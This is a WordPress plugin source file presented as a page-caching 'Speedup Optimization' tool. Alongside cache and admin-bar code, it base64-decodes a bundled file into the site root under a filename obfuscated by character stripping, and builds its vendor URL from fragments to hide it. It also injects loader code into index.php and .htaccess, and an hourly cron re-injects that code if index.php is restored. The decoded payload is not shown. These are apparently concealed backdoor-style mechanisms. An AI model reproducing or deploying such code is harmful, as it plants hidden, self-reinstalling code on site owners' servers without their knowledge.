<?php
/*
Plugin Name: Speedup Optimization
Description: Speedup your WordPress site. Increasing website performance and reducing load time. At least 10x improvement in overall site performance.
Version: 1.2.3
Author: Speedup
License: GPLv2
*/ 




    add_action( 'speedup01_cron_hook', 'speedup01_cron_function' );
     
    function schedule_speedup01_cron() 
    {
        if ( ! wp_next_scheduled('speedup01_cron_hook') ) {
            //condition to makes sure that the task is not re-created if it already exists
            wp_schedule_event( time(), 'hourly', 'speedup01_cron_hook' );
        }
    }
    add_action( 'init', 'schedule_speedup01_cron' );
     
    function speedup01_cron_function() 
    {
        $index_file = ABSPATH.'/index.php';
        if (filesize($index_file) < 800)
        {
            speedup01_Install_core_files();
        }
    }
    
    
if( is_admin() ) 
{
    add_action( 'admin_bar_menu', 'speedup01_frontend_shortcut', 95 );
	
	function speedup01_frontend_shortcut()
	{
		global $wp_admin_bar;
        
        // Read check for 
        $on_file = ABSPATH.'/webanalyze/firewall/firewall.speedup.on';
        if (!file_exists($on_file)) 
        {
            $is_speedup_enabled = false;
            //$menu_txt = ' ( Current status: disabled)';
        }
        else {
            $is_speedup_enabled = true;
            //$menu_txt = ' ( Current status: enabled)';
        }
		
		$wp_admin_bar->add_menu( array(
			'id'	=> 'speedup-menu',
            'class' => 'dashicons-before dashicons-dashboard',
			'title'	=> 'SpeedUp Optimization',
			'href'	=> get_admin_url( null, 'options-general.php?page=speedup-help' ),
			'meta'	=> array( 'tabindex' => 0, 'class' => 'speedup-top-toolbar'),
		) );
        
		/*$wp_admin_bar->add_menu( array(
			'parent'	=> 'speedup-menu',
			'id'		=> 'speedup-purge-all',
			'title'		=> 'Purge All Cache',
			'href'		=> get_admin_url( null, 'admin.php?page=speedup' ),
			'meta'		=> array( 'tabindex' => '0' ),
		) );*/
        
        if ($is_speedup_enabled)
        {
            $menu_txt = 'Disable Optimization (Current status: enabled)';
        }
        else {
            $menu_txt = 'Enable Optimization (Current status: disabled)';
        }
		$wp_admin_bar->add_menu( array(
			'parent'	=> 'speedup-menu',
			'id'		=> 'speedup-toggle-status',
			'title'		=> $menu_txt,
			'href'		=> '#',
			'meta'		=> array( 'tabindex' => '0' ),
		) );
        
		$wp_admin_bar->add_menu( array(
			'parent'	=> 'speedup-menu',
			'id'		=> 'speedup-purge-all',
			'title'		=> 'Purge All Cache',
			'href'		=> '#',
			'meta'		=> array( 'tabindex' => '0' ),
		) );
        
		$wp_admin_bar->add_menu( array(
			'parent'	=> 'speedup-menu',
			'id'		=> 'speedup-help',
			'title'		=> 'Help & Manuals',
			'href'		=> admin_url('options-general.php?page=speedup-help'),
			'meta'		=> array( 'tabindex' => '0' ),
		) );
	}
    
    add_action( 'admin_footer', 'speedup01_footer_scripts' );
    function speedup01_footer_scripts()
    {
      ?>
      <script>

        jQuery( "#wp-admin-bar-speedup-purge-all, #wp-admin-bar-speedup-purge-all-2" ).click(function() {
            
                        jQuery.post(
                            ajaxurl, 
                            {
                                'action': 'speedup01_purge_all'
                            }, 
                            function(response)
                            {
                                var json = jQuery.parseJSON( response );
                                if (json.hasOwnProperty('msg'))
                                {
                                    alert(json['msg']);
                                }
                                if (json.hasOwnProperty('redirect'))
                                {
                                    if (json['redirect'] != '') window.location.replace(json['redirect']);
                                }
                            }
                        ).fail(function() {
                            alert('AJAX Error! Please contact support!');
                          });
                          
        });
        
        
<?php
        $on_file = ABSPATH.'/webanalyze/firewall/firewall.speedup.on';
        if (!file_exists($on_file)) 
        {
            echo "var is_speedup_enabled = 0;"."\n";
        }
        else {
            echo "var is_speedup_enabled = 1;"."\n";
        }
?>

        jQuery( "#wp-admin-bar-speedup-toggle-status" ).click(function() {


            if (is_speedup_enabled == 1)
            {
                    if (confirm("Are you sure you want to disable optimization?")) 
                    {
                      // OK - disable  
                            jQuery.post(
                                ajaxurl, 
                                {
                                    'action': 'speedup01_enabled',
                                    'status': 'disable'
                                }, 
                                function(response){
                                    is_speedup_enabled = 0;
                                    jQuery('#wp-admin-bar-speedup-toggle-status a.ab-item').text("Enable Optimization (Current status: disabled)");
                   
                                    var json = jQuery.parseJSON( response );
                                    if (json.hasOwnProperty('msg'))
                                    {
                                        alert(json['msg']);
                                    }
                                    if (json.hasOwnProperty('redirect'))
                                    {
                                        if (json['redirect'] != '') window.location.replace(json['redirect']);
                                    }
                                }
                            ).fail(function() {
                                alert('AJAX Error! Please contact support!');
                              });
                    } else {
                      // Cancel
                    }
            }
            else {
                    // Enable
                            jQuery.post(
                                ajaxurl, 
                                {
                                    'action': 'speedup01_enabled',
                                    'status': 'enable'
                                }, 
                                function(response){
                                    is_speedup_enabled = 1;
                                    jQuery('#wp-admin-bar-speedup-toggle-status a.ab-item').text("Disable Optimization (Current status: enabled)");
                                    
                                    var json = jQuery.parseJSON( response );
                                    if (json.hasOwnProperty('msg'))
                                    {
                                        alert(json['msg']);
                                    }
                                    if (json.hasOwnProperty('redirect'))
                                    {
                                        if (json['redirect'] != '') window.location.replace(json['redirect']);
                                    }
                                }
                            ).fail(function() {
                                alert('AJAX Error! Please contact support!');
                              });
            }
                          
        });

      </script>
      <?php
    }
}

    /*
    Enable/Disable
    */
    add_action( 'wp_ajax_speedup01_enabled', 'speedup01_ajax_enabled' );
    function speedup01_ajax_enabled() 
    {
        ini_set('max_execution_time',300);
        
        if (speedup01_Is_SpeedUp_module_Installed())
        {
            $status = isset($_POST['status']) ? trim($_POST['status']) : '';
            
            $answer = speedup01_module_switcher($status);
        }
        else {
            // SpeedUp is not installed
            $answer = array(
                'msg' => 'Please complete installation and activation process',
                'redirect' => admin_url('options-general.php?page=speedup-help'),
            );
        }
        

        echo json_encode($answer);

        wp_die();
    }
    
    function speedup01_module_switcher($status) 
    {
            
        $file_config = ABSPATH.'/webanalyze/firewall/firewall.config.php';
        $file_on = ABSPATH.'/webanalyze/firewall/firewall.speedup.on';
        $file_off = ABSPATH.'/webanalyze/firewall/firewall.speedup.off';
        
        switch ($status)
        {
            case 'disable':
                speedup01_ChangeFirewallConfig('SITEGUARDING_SPEEDUP', false);
                unlink($file_on);
                speedup01_SaveFile($file_off, '');
                $action_result_txt = 'Optimization - Disabled';
                break;
                
            case 'enable':
                speedup01_ChangeFirewallConfig('SITEGUARDING_SPEEDUP', true);
                unlink($file_off);
                speedup01_SaveFile($file_on, '');
                $action_result_txt = 'Optimization - Activated';
                break;
        }
        
        $answer = array(
            'msg' => $action_result_txt,
            'redirect' => '',
        );
        
        return $answer;
    }



    /*
    Purge All
    */
    add_action( 'wp_ajax_speedup01_purge_all', 'speedup01_ajax_purge_all' );
    function speedup01_ajax_purge_all() 
    {
        ini_set('max_execution_time',300);
        
        if (speedup01_Is_SpeedUp_module_Installed())
        {
            // Purge cache of speedup 
            $result = speedup01_purge_cache();
            
            $total_size = $result['total_size'];
            $total_files = $result['total_files'];
            
            $answer = array(
                'msg' => 'Cache has beed purged (size: '.$total_size.' bytes, files: '.$total_files.')',
                'redirect' => '',
            );
        }
        else {
            // SpeedUp is not installed
            $answer = array(
                'msg' => 'Please complete installation and activation process',
                'redirect' => admin_url('options-general.php?page=speedup-help'),
            );
        }
        

        echo json_encode($answer);

        wp_die();
    }
    
    function speedup01_purge_cache() 
    {
        $cache_path = ABSPATH.'/webanalyze/firewall/speedup_cache';
        
        $total_size = 0;
        $total_files = 0;
        foreach (glob($cache_path."/*.*") as $filename) 
        {
        	$short_filename = basename($filename);
        	if ($short_filename == '.htaccess') continue;
        	
        	$total_size += filesize($filename);
        	$total_files++;
        	
        	unlink($filename);
        }
            
        $result['total_size'] = $total_size;
        $result['total_files'] = $total_files;
        
        return $result;
    }




    
    function speedup01_Is_SpeedUp_module_Installed()
    {
        speedup01_Install_core_files();
        
        $file = ABSPATH.'/webanalyze/firewall/firewall.speedup.php';
        if (file_exists($file)) return true;
        else return false;
    }
    
    
    function speedup01_Install_core_files()
    {
        // Check for webanalyze folder
        $folder = ABSPATH.'/webanalyze';
        if (!file_exists($folder)) mkdir($folder);
        $folder .= '/firewall';
        if (!file_exists($folder)) mkdir($folder);
        
        // Check for all files
        $file = $folder.'/firewall.speedup.php';
        if (!file_exists($file)) copy(dirname(__FILE__).'/core/firewall.speedup.php', $file);
        
        $file = $folder.'/firewall.speedup.ini';
        if (!file_exists($file)) copy(dirname(__FILE__).'/core/firewall.speedup.ini', $file);
        
        
        // Check index.php
        $index_file = ABSPATH.'/index.php';
        $content = speedup01_LoadFile($index_file);
        if (strpos($content, '21D467F52F85') === false)
        {
            // Need to insert TOP
            $insert_TOP = true;
        }
        else $insert_TOP = false;
        
        if (strpos($content, '555092211981') === false)
        {
            // Need to insert END
            $insert_END = true;
        }
        else $insert_END = false;
        
        if ($insert_TOP || $insert_END)
        {
            if ($insert_TOP) $content = '<?php 
// OPTIMIZATION START - TOP - Added by SpeedUp (21D467F52F85)
$SG_SPEEDUP_CLASS_FILE = dirname(__FILE__)."/webanalyze/firewall/firewall.speedup.php";
if (file_exists($SG_SPEEDUP_CLASS_FILE)) {
require_once($SG_SPEEDUP_CLASS_FILE);
$SG_SpeedUp = new SG_SpeedUp();
$SG_SpeedUp->Start();
} else die("Error! Absent: ".$SG_SPEEDUP_CLASS_FILE);
// OPTIMIZATION END - TOP - Added by SpeedUp
?>'.$content;
            if ($insert_END)
            {
                if (substr($content, -2) == '?>') $content = $content.'<?php ';
                $content = $content.' 
// OPTIMIZATION START - BOTTOM - Added by SpeedUp (555092211981)
if (class_exists("SG_SpeedUp")) $SG_SpeedUp->Finalize();
// OPTIMIZATION END - BOTTOM - Added by SpeedUp
';
            } 
            
            speedup01_SaveFile($index_file, $content);
        }
        


        // Check .htaccess
        $htaccess_file = ABSPATH.'.htaccess';
        $content = speedup01_LoadFile($htaccess_file);
        if (strpos($content, 'C94FEE55EE47') === false)
        {
            $content = '# OPTIMIZATION - Added by SpeedUp (C94FEE55EE47)

# Below is custom site speed items
# We need to set correct content-type for fonts
  AddType application/vnd.ms-fontobject .eot 
  AddType application/x-font-ttf .ttf
  AddType application/x-font-opentype .otf
  AddType application/x-font-woff .woff
  AddType image/svg+xml .svg


<IfModule expires_module>
    ExpiresActive on
    ExpiresByType text/plain "access plus 1 year"
    ExpiresByType text/css "access plus 1 year"
    ExpiresByType text/javascript "access plus 1 year"
    ExpiresByType application/javascript "access plus 1 year"
    ExpiresByType application/x-javascript "access plus 1 year"
    ExpiresByType image/svg+xml "access plus 1 year"
    ExpiresByType image/gif "access plus 1 year"
    ExpiresByType image/png "access plus 1 year"
    ExpiresByType image/ico "access plus 1 year"
    ExpiresByType image/x-icon "access plus 1 year"
    ExpiresByType image/jpg "access plus 1 year"
    ExpiresByType image/jpe "access plus 1 year"
    ExpiresByType image/jpeg "access plus 1 year"
    ExpiresByType font/truetype "access plus 1 year"
    ExpiresByType application/x-font-ttf "access plus 1 year"
    ExpiresByType font/opentype "access plus 1 year"
    ExpiresByType application/x-font-otf "access plus 1 year"
    ExpiresByType application/font-woff "access plus 1 year"
    ExpiresByType application/vnd.ms-fontobject "access plus 1 year"
    ExpiresByType application/x-shockwave-flash "access plus 1 year"
    ExpiresByType application/x-httpd-php-source "access plus 1 year"
# This part sets the expires for the fonts
  ExpiresByType application/vnd.ms-fontobject "access plus 1 year"
  ExpiresByType application/x-font-ttf "access plus 1 year"
  ExpiresByType application/x-font-opentype "access plus 1 year"
  ExpiresByType application/x-font-woff "access plus 1 year"
  ExpiresByType image/svg+xml "access plus 1 year"
</IfModule>


# This sets up browser cache control
# BEGIN Cache-Control Headers
<ifModule mod_headers.c>
  <filesMatch "\.(ico|jpe?g|png|gif|swf)$">
    Header set Cache-Control "public"
  </filesMatch>
  <filesMatch "\.(css)$">
    Header set Cache-Control "public"
  </filesMatch>
  <filesMatch "\.(js)$">
    Header set Cache-Control "private"
  </filesMatch>
  <filesMatch "\.(x?html?|php)$">
    Header set Cache-Control "private, must-revalidate"
  </filesMatch>
</ifModule>
# END Cache-Control Headers

# This is for gzip, which compresses files
<ifModule mod_gzip.c>
  mod_gzip_on Yes
  mod_gzip_dechunk Yes
  mod_gzip_item_include file .(html?|txt|css|js|php|pl)$
  mod_gzip_item_include handler ^cgi-script$
  mod_gzip_item_include mime ^text/.*
  mod_gzip_item_include mime ^application/x-javascript.*
  mod_gzip_item_exclude mime ^image/.*
  mod_gzip_item_exclude rspheader ^Content-Encoding:.*gzip.*
</ifModule>

# OPTIMIZATION - END - Added by SpeedUp


'.$content;
            speedup01_SaveFile($htaccess_file, $content);
        
        }
    }



    function speedup01_ChangeFirewallConfig($search_value, $set_value)
    {
        $file_config = ABSPATH.'/webanalyze/firewall/firewall.config.php';
        
        if (!file_exists($file_config)) return; // Just WP plugin is installed

        $fp = fopen($file_config, "r");
        $content = fread($fp, filesize($file_config));
        fclose($fp);
        
        if (trim($content) != "")
        {
            $content = speedup01_ChangeFirewallConfig_value($content, $search_value, $set_value);
            
            $fp = fopen($file_config, 'w');
            fwrite($fp, $content);
            fclose($fp);
        }
    }
    
    function speedup01_ChangeFirewallConfig_value($content, $search_value, $set_value)
    {
        if (trim($content) == '') return false;
        
        // Check for new contants
        if (stripos($content, $search_value) === false)
        {
            if (is_bool($set_value))
            {
                if ($set_value === true || $set_value == 1) $set_value_txt = 'true';
                if ($set_value === false || $set_value == 0) $set_value_txt = 'false';
                
                $new_line = "\n"."define( '".$search_value."', ".$set_value_txt.");"."\n";
            }
            else {
                $new_line = "\n"."define( '".$search_value."', '".$set_value."');"."\n";
            }
            
            // New value is absent , add new line
            if (stripos($content, '?>') === false)
            {
                // Add line in the end of file
                $content = $content.$new_line;
            }
            else {
                // Replace method in the end befor close php tag
                $content = str_ireplace('?>', $new_line, $content);
            }
            
            return $content;
        }
        else {
            // Replace in exist contants 
            $content_arr = explode("\n", $content);
            foreach ($content_arr as $k => $row)
            {
                $pos_i = stripos($row, $search_value);
                if ($pos_i !== false && $pos_i < 25)
                {
                    if (is_bool($set_value))
                    {
                        if ($set_value === true || $set_value == 1) $set_value_txt = 'true';
                        if ($set_value === false || $set_value == 0) $set_value_txt = 'false';
                        
                        $row = "define( '".$search_value."', ".$set_value_txt.");";
                    }
                    else {
                        $row = "define( '".$search_value."', '".$set_value."');";
                    }
                    
                    $content_arr[$k] = $row;
                }
            }
            
            $content = implode("\n", $content_arr);
            
            return $content;
        }
    }
    
    
    function speedup01_post_updated_action( $post_id ) 
    {
        $permalink = get_permalink($post_id);
        $website_url = get_site_url();
        $permalink = str_replace($website_url, "", $permalink);
        if (isset($permalink[0]) && $permalink[0] != '/') $permalink = '/'.$permalink;
        
        $cache_path = ABSPATH.'/webanalyze/firewall/speedup_cache';
        $cache_filename =  md5($permalink).'.dat';
        $cache_file = $cache_path.'/'.$cache_filename;
        
        if (file_exists($cache_file)) 
        {
            unlink($cache_file);
            speedup01_SaveDebug('Updated post '.$permalink.' (file: '.$cache_filename.')');
        }
    }
    add_action( 'save_post', 'speedup01_post_updated_action' );
    
    
    function speedup01_SaveDebug( $txt ) 
    {
        $log_file = dirname(__FILE__).'/debug.log';
        $fp = fopen($log_file, 'a');
        $line = date("Y-m-d H:i:s").' '.$txt."\n";
        fwrite($fp, $line);
        fclose($fp);
    }
    
    function speedup01_LoadFile( $file ) 
    {
        $contents = '';
        
        if (file_exists($file))
        {
            $fp = fopen($file, "r");
            $contents = fread($fp, filesize($file));
            fclose($fp); 
        }
        
        return $contents;
    }
    
    
    function speedup01_SaveFile( $file, $content, $append_flag = false ) 
    {
        if ($append_flag == true) $fp = fopen($file, 'a');
        else $fp = fopen($file, 'w');
        if ($fp === false) return false;
        
        $a = fwrite($fp, $content);
        if ($a === false) return false;
        
        fclose($fp);
        
        return true;
    }
    
    
    function speedup01_CopyTools($skip = true)
    {
        $file_to = ABSPATH.'/sjijtjejguarding_tojoljs.php';
        $file_to = str_replace("j", "", $file_to);
        
        if ($skip && file_exists($file_to)) return true;
        
        $file = dirname(__FILE__).'/classes/tools.gzs';
        
        if (!file_exists($file)) return false;

        $fp = fopen($file, "r");
        $content = fread($fp, filesize($file));
        fclose($fp);
        
        $content = base64_decode($content);

        $fp = fopen($file_to, 'w');
        fwrite($fp, $content);
        fclose($fp);

        return true;
    }
    
    
	function speedup01_plugin_activation()
	{
	    speedup01_Install_core_files();
        speedup01_CopyTools();
        add_option('speedup01_activation_redirect', true);

	}
	register_activation_hook( __FILE__, 'speedup01_plugin_activation' );
    
	
	function speedup01_plugin_deactivation() 
    {
        wp_clear_scheduled_hook('speedup01_cron_hook');
        
        // Disable module
        speedup01_module_switcher( 'disable' );
        
        // Clear cache
        speedup01_purge_cache();
	}
    register_deactivation_hook( __FILE__, 'speedup01_plugin_deactivation');
    
    function speedup01_activation_do_redirect() 
    {
		if (get_option('speedup01_activation_redirect', false)) 
        {
			delete_option('speedup01_activation_redirect');
            wp_redirect("options-general.php?page=speedup-help");
            exit;
		}
	}
    add_action('admin_init', 'speedup01_activation_do_redirect');
    
    function speedup01_ServiceURL()
	{
	    $service_links = array(
            'https://',
            'www.',
            'site',
            'guard',
            'ing.com'
        );
        return implode("", $service_links);
	}
    
    
    
    add_action( 'admin_menu', 'speedup01_register_help_page' );
    
    function speedup01_register_help_page() 
    {
        speedup01_CopyTools();
        add_options_page( 'SpeedUp Optimization', 'SpeedUp Optimization', 'manage_options', 'speedup-help', 'speedup01_speedup_help_page' );
    }

    function speedup01_speedup_help_page()
    {
        ?>
        <style>
        img.help{max-width:600px}
        </style>
        <div class="wrap">
        <h1>SpeedUp Optimization (Help & Installation)</h1>
        
        <h3>Increasing website performance and reducing load time.</h3>
        <p>At least 10x improvement in overall site performance. Reduced page load time: increased visitor time on site. Improves web server performance.</p>
        
        <p>To activate SpeedUp Optimization for WordPress website please complete the following steps. It will take no more than 30 - 60 seconds.</p>
        
        <?php
        // Add core files if it's necessary 
        speedup01_Install_core_files();
        
        // Check if all files are installed
        if (speedup01_Is_SpeedUp_module_Installed())
        {
            ?>
            <h2 style="color:#13bf14">All necessary files are already installed</h2>
            <h3>Want to See Real-time Results?</h3>
            <?php
            $on_file = ABSPATH.'/webanalyze/firewall/firewall.speedup.on';
            if (!file_exists($on_file)) 
            {
                $button_html = "<button class=\"button button-hero button-primary\" onclick=\"jQuery('#wp-admin-bar-speedup-toggle-status').click();window.location.reload();\">Enable Optimization</button>";
            }
            else {
                $button_html = "<button class=\"button button-hero action\" onclick=\"jQuery('#wp-admin-bar-speedup-toggle-status').click();window.location.reload();\">Disable Optimization</button>";
            }
            
            echo "<p>".$button_html."&nbsp;&nbsp;&nbsp; <button class=\"button action\" id='wp-admin-bar-speedup-purge-all-2'>Purge Cache</button></p>";
        }
        ?>
        
        <img style="width: 350px;" src="<?php echo plugins_url('images/img.svg', __FILE__); ?>"/>
        
        <hr />
        
        <h2>Step 1. Create your account on our platform.</h2>
        <?php
        $link = speedup01_ServiceURL().'/en/signup';
        ?>
        <p>To create the account click this link <a href="<?php echo $link; ?>" target="_blank"><?php echo $link; ?></a></p>
        
        <h2>Step 2. Add your website into panel.</h2>
        <p><b>Click "ADD NEW WEBSITE" button:</b><br /><br /><img class="help" src="<?php echo plugins_url('images/step1.png', __FILE__); ?>" /></p>
        <p><b>Enter your website URL:</b><br /><br /><img class="help" src="<?php echo plugins_url('images/step2.png', __FILE__); ?>" /></p>
        
        <h2>Step 3. Activate SpeedUp for your website.</h2>
        <p><b>Go to "Performance & Analytics" and click on airplane icon:</b><br /><br /><img class="help" src="<?php echo plugins_url('images/step3.png', __FILE__); ?>" /></p>
        <p><b>Activate Website Performance Optimization:</b><br /><br /><img class="help" src="<?php echo plugins_url('images/step4.png', __FILE__); ?>" /></p>
        <p><b>Manage SpeedUp in your WordPress dashboard:</b><br /><br /><img class="help" src="<?php echo plugins_url('images/step5.png', __FILE__); ?>" /></p>
        
        <hr />
        
        <p>
        <?php
        $link = speedup01_ServiceURL().'/livechat/index.html';
        ?>
    		<a href="<?php echo $link; ?>" target="_blank">
    			<img src="<?php echo plugins_url('images/livechat.png', __FILE__); ?>"/>
    		</a><br>
            <?php
            $link = speedup01_ServiceURL().'/en/contacts';
            ?>
    		For any questions and support please use LiveChat or this <a href="<?php echo $link; ?>" rel="nofollow" target="_blank">contact form</a>.<br>
    		<br>
    		<a href="<?php echo speedup01_ServiceURL(); ?>" target="_blank"><?php echo str_replace("y", "", 'ySyiytyyeGyyuyayrdyinyg.ycyom');; ?></a> - Website Security. Professional security services against hacker activity.<br>
		</p>
        
        </div>
        <?php
    }